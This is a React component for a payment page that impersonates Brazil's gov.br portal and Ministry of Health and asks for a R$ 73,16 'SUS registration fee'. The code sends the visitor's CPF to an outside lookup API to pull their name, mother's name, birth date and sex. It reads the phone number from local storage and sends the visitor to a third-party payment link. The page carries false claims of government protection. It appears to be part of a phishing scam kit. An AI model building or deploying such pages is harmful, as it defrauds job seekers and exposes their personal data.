import React, { useState, useEffect } from 'react';
import { 
  ArrowLeft, 
  Shield, 
  User, 
  CheckCircle,
  ExternalLink,
  Home,
  Scale
} from 'lucide-react';

interface CpfData {
  cpf: string;
  nome: string;
  mae: string;
  nascimento: string;
  sexo: string;
}

interface PaymentPageProps {
  selectedJob: {
    id: string;
    title: string;
    salary: string;
  } | null;
  cepData: {
    cep: string;
    logradouro: string;
    bairro: string;
    localidade: string;
    uf: string;
    ibge: string;
  } | null;
  cpfData: string;
}

const PaymentPage: React.FC<PaymentPageProps> = ({ selectedJob, cepData, cpfData }) => {
  const [userCpfData, setUserCpfData] = useState<CpfData | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [userPhone, setUserPhone] = useState<string>('');

  useEffect(() => {
    // Get phone number from localStorage
    const storedPhone = localStorage.getItem('userPhone');
    if (storedPhone) {
      setUserPhone(storedPhone);
    }

    const fetchUserData = async () => {
      if (cpfData) {
        setIsLoading(true);
        try {
          const cleanCpf = cpfData.replace(/\D/g, '');
          const response = await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${cleanCpf}`);
          const data = await response.json();
          
          if (data.status === 200 && data.nome) {
            const formattedData = {
              cpf: data.cpf || cpfData,
              nome: data.nome,
              mae: data.mae || 'Não informado',
              nascimento: data.nascimento,
              sexo: data.sexo
            };
            setUserCpfData(formattedData);
          }
        } catch (error) {
          console.error('Erro ao buscar dados do CPF:', error);
        } finally {
          setIsLoading(false);
        }
      }
    };

    fetchUserData();
  }, [cpfData]);

  const handleBack = () => {
    window.history.back();
  };

  const handlePayment = () => {
    // Redirect to the payment URL
    window.open('https://pay.INSCRICAOSEGURA.ORG/P5LNZ8zR7vMgaRy?utm_source=organicjLj6861d88756a3fe96638efdda&utm_campaign=&utm_medium=&utm_content=&utm_term=&subid=organic');
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header className="bg-white shadow-sm relative">
        <div className="flex justify-between items-center px-4 py-3 border-b border-gray-200">
          <div className="flex items-center">
            <button className="flex items-center hover:opacity-80 transition-opacity bg-transparent border-none p-0">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
                alt="gov.br" 
                className="h-8"
              />
            </button>
          </div>
          
          <div className="flex items-center space-x-4">
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Menu">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="12" cy="12" r="1"></circle>
                <circle cx="12" cy="5" r="1"></circle>
                <circle cx="12" cy="19" r="1"></circle>
              </svg>
            </button>
            <div className="w-px h-6 bg-blue-900"></div>
            <button 
              className="text-blue-900 hover:text-blue-700 transition-colors" 
              aria-label="Acessibilidade" 
              title="Alternar modo de alto contraste"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="13.5" cy="6.5" r=".5" fill="currentColor"></circle>
                <circle cx="17.5" cy="10.5" r=".5" fill="currentColor"></circle>
                <circle cx="8.5" cy="7.5" r=".5" fill="currentColor"></circle>
                <circle cx="6.5" cy="12.5" r=".5" fill="currentColor"></circle>
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"></path>
              </svg>
            </button>
            
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Aplicativos">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <rect width="18" height="18" x="3" y="3" rx="2"></rect>
                <path d="M3 9h18"></path>
                <path d="M3 15h18"></path>
                <path d="M9 3v18"></path>
                <path d="M15 3v18"></path>
              </svg>
            </button>
            <button className="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium border-none">
              Login
            </button>
          </div>
        </div>
        
        <div className="flex justify-between items-center px-4 py-2 bg-gray-50">
          <div className="flex items-center">
            <button className="text-blue-900 hover:text-blue-700 transition-colors mr-3" aria-label="Menu lateral">
              <User className="w-5 h-5" />
            </button>
            <span className="text-gray-800 text-sm font-medium">Ministério da Saúde</span>
          </div>
          
          <div className="flex items-center">
            <div className="flex flex-col items-center text-green-800 font-bold text-sm">
              <div className="flex items-center">
                <Shield className="w-4 h-4 mr-2" />
                PAGAMENTO
              </div>
              <div>100% SEGURO</div>
            </div>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <nav className="bg-gray-50 border-b border-gray-200 px-4 py-3" aria-label="Navegação estrutural">
        <div className="flex flex-wrap items-center gap-1 text-sm">
          <button 
            type="button" 
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs bg-transparent border-none p-0"
          >
            <Home className="w-3 h-3" />
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <button 
            type="button" 
            onClick={handleBack}
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs bg-transparent border-none p-0"
          >
            Comprovante
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <span className="text-gray-800 text-xs font-medium">Pagamento</span>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <h1 className="text-3xl font-semibold mb-6 text-center text-green-800">
          Finalizar Pagamento da Taxa de Inscrição
        </h1>
        
        <div className="bg-white p-6 rounded-lg shadow-md max-w-2xl mx-auto">
          {/* Resumo do Pagamento */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
            <h2 className="text-xl font-semibold text-green-800 mb-4 flex items-center">
              <Shield className="w-5 h-5 mr-2" />
              Resumo do Pagamento
            </h2>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <p className="text-sm text-gray-500 mb-1">Serviço</p>
                <p className="font-medium text-gray-900">Taxa de Inscrição - SUS</p>
              </div>
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <p className="text-sm text-gray-500 mb-1">Valor</p>
                <p className="font-bold text-green-600 text-lg">R$ 73,16</p>
              </div>
            </div>
          </div>

          {/* Dados para Pagamento */}
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-6">
            <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
              <User className="w-5 h-5 mr-2" />
              Dados para Pagamento
            </h3>
            {isLoading ? (
              <div className="text-center py-4">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-green-600 mx-auto mb-2"></div>
                <p className="text-gray-600 text-sm">Carregando dados...</p>
              </div>
            ) : userCpfData ? (
              <div className="space-y-3">
                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <p className="text-sm text-gray-500 mb-1">Nome Completo</p>
                    <p className="font-medium text-gray-900">{userCpfData.nome}</p>
                  </div>
                  <div>
                    <p className="text-sm text-gray-500 mb-1">CPF</p>
                    <p className="font-medium text-gray-900 font-mono">{cpfData}</p>
                  </div>
                </div>
                <div>
                  <p className="text-sm text-gray-500 mb-1">Telefone</p>
                  <p className="font-medium text-gray-900">{userPhone || '(12) 13124-1241'}</p>
                </div>
              </div>
            ) : (
              <div className="space-y-3">
                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <p className="text-sm text-gray-500 mb-1">Nome Completo</p>
                    <p className="font-medium text-gray-900">Rizia Regia Da Silva Rodrigues Magalhaes</p>
                  </div>
                  <div>
                    <p className="text-sm text-gray-500 mb-1">CPF</p>
                    <p className="font-medium text-gray-900 font-mono">{cpfData || '011.011.011-05'}</p>
                  </div>
                </div>
                <div>
                  <p className="text-sm text-gray-500 mb-1">Telefone</p>
                  <p className="font-medium text-gray-900">{userPhone || '(12) 13124-1241'}</p>
                </div>
              </div>
            )}
            <div className="mt-4 p-3 bg-green-50 border border-green-200 rounded-md">
              <p className="text-sm text-green-700 flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                Seus dados serão automaticamente preenchidos na próxima tela
              </p>
            </div>
          </div>

          {/* Pagamento 100% Seguro */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
            <h3 className="text-lg font-semibold text-green-800 mb-3 flex items-center">
              <Shield className="w-5 h-5 mr-2" />
              Pagamento 100% Seguro
            </h3>
            <ul className="text-sm text-green-700 space-y-2">
              <li className="flex items-center">
                <Scale className="w-4 h-4 mr-2" />
                <strong>Ambiente protegido pelo Ministério da Saúde</strong>
              </li>
              <li className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                Plataforma de pagamento certificada e segura
              </li>
              <li className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                Dados protegidos por criptografia SSL
              </li>
              <li className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                <strong>Aceita PIX e Boleto Bancário</strong>
              </li>
              <li className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                Confirmação automática após pagamento
              </li>
              <li className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                Conformidade com regulamentações do Governo Federal
              </li>
            </ul>
            <div className="mt-4 p-3 bg-white border border-green-300 rounded-md">
              <h4 className="font-semibold text-green-800 mb-2">Formas de Pagamento Disponíveis:</h4>
              <div className="flex items-center space-x-4 text-xs text-green-700">
                <div className="flex items-center">
                  <span className="w-2 h-2 bg-green-600 rounded-full mr-2"></span>
                  <strong>PIX</strong> - Aprovação instantânea
                </div>
                <div className="flex items-center">
                  <span className="w-2 h-2 bg-green-600 rounded-full mr-2"></span>
                  <strong>Boleto</strong> - Até 3 dias úteis
                </div>
              </div>
            </div>
          </div>

          {/* Botão de Pagamento */}
          <div className="text-center">
            <button 
              onClick={handlePayment}
              className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-bold py-4 px-8 rounded-lg text-lg transition-all duration-200 flex items-center justify-center shadow-lg transform hover:scale-105 disabled:transform-none disabled:cursor-not-allowed"
            >
              <ExternalLink className="w-5 h-5 mr-3" />
              PAGAR TAXA DE INSCRIÇÃO
              <span className="ml-3 text-sm font-normal">(R$ 73,16)</span>
            </button>
          </div>

          {/* Botão Voltar */}
          <div className="mt-6 text-center">
            <button 
              type="button" 
              onClick={handleBack}
              className="text-blue-600 hover:text-blue-800 text-sm font-medium flex items-center mx-auto bg-transparent border-none p-0"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Voltar para o comprovante
            </button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-slate-900 text-white">
        <div className="container mx-auto px-6 py-8">
          <div className="py-6">
            <a 
              href="https://www.gov.br"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block hover:opacity-80 transition-opacity"
            >
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
                alt="Government of Brazil logo"
                className="w-40 brightness-0 invert"
              />
            </a>
          </div>

          <div className="border-t border-gray-600"></div>

          <nav aria-label="Menu principal do rodapé" className="mt-6">
            <ul>
              <li className="">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a
                      href="https://www.gov.br/sus/pt-br"
                      className="text-sm hover:text-gray-300 transition-colors flex items-center"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      SUS
                      <ExternalLink className="w-3 h-3 ml-1" />
                    </a>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      EDUCAÇÃO BÁSICA
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção EDUCAÇÃO BÁSICA">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      ENSINO SUPERIOR
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção ENSINO SUPERIOR">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      PROGRAMAS EDUCACIONAIS
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção PROGRAMAS EDUCACIONAIS">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a
                      href="https://www.gov.br/acessoainformacao/pt-br"
                      className="text-sm hover:text-gray-300 transition-colors flex items-center"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      ACESSO À INFORMAÇÃO
                      <ExternalLink className="w-3 h-3 ml-1" />
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção ACESSO À INFORMAÇÃO">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      PORTAL DO PROFESSOR
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção PORTAL DO PROFESSOR">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      CANAIS DE ATENDIMENTO
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção CANAIS DE ATENDIMENTO">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
              <li className="border-t border-gray-600">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a href="#" className="text-sm hover:text-gray-300 transition-colors flex items-center" target="_self">
                      POLÍTICAS EDUCACIONAIS
                    </a>
                    <button className="text-gray-400 hover:text-white transition-colors" aria-label="Expandir seção POLÍTICAS EDUCACIONAIS">
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-4 h-4">
                        <path d="m6 9 6 6 6-6"></path>
                      </svg>
                    </button>
                  </div>
                </div>
              </li>
            </ul>
          </nav>

          <div className="mt-6 flex items-center">
            <button className="flex items-center hover:text-gray-300 transition-colors" aria-label="Redefinir configurações de cookies">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5 mr-2">
                <path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path>
                <path d="M8.5 8.5v.01"></path>
                <path d="M16 15.5v.01"></path>
                <path d="M12 12v.01"></path>
                <path d="M11 17v.01"></path>
                <path d="M7 14v.01"></path>
              </svg>
              <span className="text-sm">Redefinir Cookies</span>
            </button>
          </div>

          <div className="mt-8">
            <div className="text-sm font-bold mb-4">Redes sociais</div>
            <ul className="flex gap-4">
              <li>
                <a
                  href="https://www.youtube.com/user/ministeriodaeducacao"
                  target="_blank"
                  rel="noopener noreferrer"
                  aria-label="YouTube"
                  className="text-white hover:text-gray-300 transition-colors text-2xl inline-block hover:scale-110 transform transition-transform"
                  title="Seguir no YouTube"
                >
                  📺
                </a>
              </li>
              <li>
                <a
                  href="https://www.facebook.com/MEC.Comunicacao"
                  target="_blank"
                  rel="noopener noreferrer"
                  aria-label="Facebook"
                  className="text-white hover:text-gray-300 transition-colors text-2xl inline-block hover:scale-110 transform transition-transform"
                  title="Seguir no Facebook"
                >
                  📘
                </a>
              </li>
              <li>
                <a
                  href="https://twitter.com/mec_comunicacao"
                  target="_blank"
                  rel="noopener noreferrer"
                  aria-label="Twitter"
                  className="text-white hover:text-gray-300 transition-colors text-2xl inline-block hover:scale-110 transform transition-transform"
                  title="Seguir no Twitter"
                >
                  🐦
                </a>
              </li>
              <li>
                <a
                  href="https://www.instagram.com/mec.oficial"
                  target="_blank"
                  rel="noopener noreferrer"
                  aria-label="Instagram"
                  className="text-white hover:text-gray-300 transition-colors text-2xl inline-block hover:scale-110 transform transition-transform"
                  title="Seguir no Instagram"
                >
                  📷
                </a>
              </li>
            </ul>
          </div>

          <div className="mt-8 pt-6 border-t border-gray-600">
            <div className="grid md:grid-cols-2 gap-4 text-xs text-gray-400">
              <div>
                <p className="mb-2">
                  <strong>Ministério da Educação</strong><br />
                  Esplanada dos Ministérios, Bloco L<br />
                  CEP: 70047-900 - Brasília/DF
                </p>
                <p>
                  <strong>Central de Atendimento:</strong>{' '}
                  <a href="tel:08007616161" className="hover:text-white transition-colors">
                    0800 761 6161
                  </a>
                </p>
              </div>
              <div className="text-right">
                <p className="mb-2">
                  <a
                    href="https://www.gov.br/pt-br/termos-de-uso"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Termos de Uso
                  </a>{' '}
                  |{' '}
                  <a
                    href="https://www.gov.br/pt-br/politica-de-privacidade"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Política de Privacidade
                  </a>
                </p>
                <p>© 2025 Governo Federal do Brasil</p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PaymentPage;